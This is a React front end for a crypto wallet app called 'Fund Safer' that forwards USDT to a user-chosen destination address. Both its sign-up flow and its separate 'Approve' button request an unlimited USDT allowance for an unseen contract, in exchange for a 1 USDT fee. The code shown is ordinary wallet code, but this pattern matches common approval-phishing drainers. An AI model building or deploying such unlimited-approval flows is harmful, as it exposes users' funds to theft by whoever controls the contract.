import { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { CONTRACT_ADDRESS, USDT_ADDRESS, CONTRACT_ABI, USDT_ABI } from './constants';

function App() {
  const [account, setAccount] = useState(null);
  const [isRegistered, setIsRegistered] = useState(false);
  const [destination, setDestination] = useState("");
  const [inputDest, setInputDest] = useState("");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);

  // 1. Connect Wallet
  const connectWallet = async () => {
    if (window.ethereum) {
      try {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        setAccount(address);
        checkRegistration(address, provider);
      } catch (error) {
        console.error("Connection failed", error);
      }
    } else {
      alert("Please install Metamask!");
    }
  };

  // 2. Check if user is registered
  const checkRegistration = async (userAddress, provider) => {
    const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const data = await contract.getUserDashboardData(userAddress);
      setIsRegistered(data.isReg);
      setDestination(data.dest);
      if (data.isReg) fetchHistory(userAddress, provider);
    } catch (error) {
      console.error("Error checking registration", error);
    }
  };

  // 3. Approve USDT & Register (Sign Up)
  const handleSignUp = async () => {
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      const coreContract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      console.log("Approving USDT...");
      const approveTx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
      await approveTx.wait();

      console.log("Registering...");
      const regTx = await coreContract.register();
      await regTx.wait();

      alert("Registration Successful!");
      setIsRegistered(true);
    } catch (error) {
      console.error("Signup Failed", error);
      alert("Signup Failed! Check console.");
    }
    setLoading(false);
  };

  // 4. Set Destination Wallet
  const handleSetDestination = async () => {
    if (!inputDest) return alert("Enter an address!");
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      const tx = await contract.setDestination(inputDest);
      await tx.wait();
      
      setDestination(inputDest);
      alert("Destination Saved!");
    } catch (error) {
      console.error("Failed to set destination", error);
    }
    setLoading(false);
  };

  // 5. NAYA FEATURE: Manual Approve USDT
  const handleManualApprove = async () => {
    setLoading(true);
    try {
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
      
      console.log("Granting Manual Allowance...");
      const approveTx = await usdtContract.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
      await approveTx.wait();
      
      alert("Allowance Granted Successfully!");
    } catch (error) {
      console.error("Approval Failed", error);
      alert("Approval Failed! Check console.");
    }
    setLoading(false);
  };

  // 6. Fetch History
  const fetchHistory = async (userAddress, provider) => {
    const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
    try {
      const hist = await contract.getUserTransferHistory(userAddress);
      setHistory(hist);
    } catch (error) {
      console.error("Error fetching history", error);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 font-sans bg-[#05020a] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-[#2a0a4a] via-[#090514] to-[#05020a]">
      
      <div className="text-center mb-10 flex flex-col items-center">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 bg-gradient-to-tr from-cyan-400 to-purple-600 rounded-lg shadow-[0_0_15px_rgba(147,51,234,0.5)] flex items-center justify-center">
            <span className="text-white font-bold text-xl">F</span>
          </div>
          <h1 className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-purple-400 to-pink-400 tracking-tight">
            Fund Safer
          </h1>
        </div>
        <p className="text-purple-300/60 mt-3 text-sm tracking-widest uppercase">Auto-Forwarding Exchange</p>
      </div>

      <div className="w-full max-w-md bg-[#130b29]/80 backdrop-blur-2xl border border-purple-500/20 rounded-[32px] p-8 shadow-[0_0_50px_-12px_rgba(147,51,234,0.25)] relative overflow-hidden">
        
        <div className="absolute -top-20 -right-20 w-40 h-40 bg-purple-500/20 rounded-full blur-3xl"></div>
        <div className="absolute -bottom-20 -left-20 w-40 h-40 bg-pink-500/10 rounded-full blur-3xl"></div>

        <div className="relative z-10">
          {!account ? (
            <div className="text-center py-6">
              <h2 className="text-3xl font-bold mb-2 text-white">Login</h2>
              <p className="text-gray-400 text-sm mb-8">Get started today by connecting your wallet</p>
              
              <button 
                onClick={connectWallet}
                className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] hover:shadow-[0_0_20px_rgba(219,39,119,0.4)] text-white font-bold py-4 px-6 rounded-2xl transition-all duration-300 transform hover:scale-[1.02] active:scale-95 flex justify-center items-center gap-2"
              >
                Connect Wallet ➔
              </button>
            </div>
          ) : !isRegistered ? (
            <div className="py-2">
              <h2 className="text-3xl font-bold mb-2 text-center text-white">Sign Up</h2>
              <div className="flex justify-center items-center gap-2 mb-8 text-sm">
                <span className="w-2 h-2 rounded-full bg-green-400 shadow-[0_0_8px_rgba(74,222,128,0.8)] animate-pulse"></span>
                <p className="text-purple-200">{account.substring(0,6)}...{account.slice(-4)}</p>
              </div>
              
              <div className="mb-8">
                <label className="block text-gray-400 text-sm mb-3 ml-1">Registration Package</label>
                <div className="bg-[#0a0515] p-4 rounded-2xl border border-purple-500/30 text-white font-medium flex justify-between items-center shadow-inner">
                  <span>Activation Fee</span>
                  <span className="text-pink-400">1.00 USDT</span>
                </div>
              </div>

              <button 
                onClick={handleSignUp}
                disabled={loading}
                className="w-full bg-gradient-to-r from-[#9333ea] to-[#db2777] hover:shadow-[0_0_20px_rgba(219,39,119,0.4)] text-white font-bold py-4 px-6 rounded-2xl transition-all duration-300 transform hover:scale-[1.02] active:scale-95 disabled:opacity-50 disabled:transform-none"
              >
                {loading ? "Processing..." : "Sign Up ➔"}
              </button>
            </div>
          ) : (
            <div className="py-2">
              <h2 className="text-2xl font-bold mb-1 text-white">Dashboard</h2>
              <div className="flex items-center gap-2 mb-6 text-sm">
                <span className="w-2 h-2 rounded-full bg-cyan-400 shadow-[0_0_8px_rgba(34,211,238,0.8)]"></span>
                <p className="text-cyan-200">Active: {account.substring(0,6)}...{account.slice(-4)}</p>
              </div>

              <div className="mb-6">
                <label className="block text-gray-400 text-sm mb-2 ml-1">Destination Address</label>
                <input 
                  type="text" 
                  placeholder={destination !== "0x0000000000000000000000000000000000000000" ? destination : "Enter 0x..."}
                  onChange={(e) => setInputDest(e.target.value)}
                  className="w-full bg-[#0a0515] text-white placeholder-gray-600 border border-purple-500/30 rounded-2xl p-4 focus:outline-none focus:border-pink-500 focus:ring-1 focus:ring-pink-500 transition-all shadow-inner"
                />
              </div>

              <div className="flex flex-col sm:flex-row gap-3 mb-8">
                <button 
                  onClick={handleSetDestination}
                  disabled={loading}
                  className="flex-1 bg-gradient-to-r from-[#db2777] to-[#9333ea] hover:shadow-[0_0_20px_rgba(219,39,119,0.4)] text-white font-bold py-3 px-4 rounded-xl transition-all duration-300 active:scale-95 disabled:opacity-50 text-sm"
                >
                  {loading ? "Saving..." : "Save Dest"}
                </button>
                
                <button 
                  onClick={handleManualApprove}
                  disabled={loading}
                  className="flex-1 bg-[#1a103c] border border-purple-500/50 hover:bg-[#251554] hover:shadow-[0_0_15px_rgba(147,51,234,0.3)] text-purple-300 font-bold py-3 px-4 rounded-xl transition-all duration-300 active:scale-95 disabled:opacity-50 text-sm flex justify-center items-center gap-2"
                >
                  <span className="text-green-400 text-lg leading-none">✓</span> Approve
                </button>
              </div>

              <div className="pt-6 border-t border-purple-500/20">
                <div className="flex justify-between items-center mb-4">
                  <h3 className="text-sm font-semibold text-gray-300 uppercase tracking-wider">Recent Transfers</h3>
                  <span className="text-xs text-purple-400 bg-purple-500/10 px-2 py-1 rounded-md">Live</span>
                </div>
                
                {history.length === 0 ? (
                  <div className="text-center py-6 bg-[#0a0515] rounded-2xl border border-purple-500/10">
                    <p className="text-sm text-gray-500">No transfers detected yet.</p>
                  </div>
                ) : (
                  <div className="space-y-3 max-h-48 overflow-y-auto pr-2 custom-scrollbar">
                    {history.map((tx, index) => (
                      <div key={index} className="bg-[#0a0515] p-3.5 rounded-xl border border-purple-500/20 flex justify-between items-center hover:border-purple-500/50 transition-colors">
                        <div className="flex flex-col">
                          <span className="text-xs text-gray-500 mb-1">Sent to</span>
                          <span className="text-sm text-gray-200">{tx.destination.substring(0,6)}...{tx.destination.slice(-4)}</span>
                        </div>
                        <div className="flex flex-col items-end">
                          <span className="text-sm font-bold text-green-400">+{ethers.formatUnits(tx.amount, 18)}</span>
                          <span className="text-[10px] text-gray-500">USDT</span>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default App;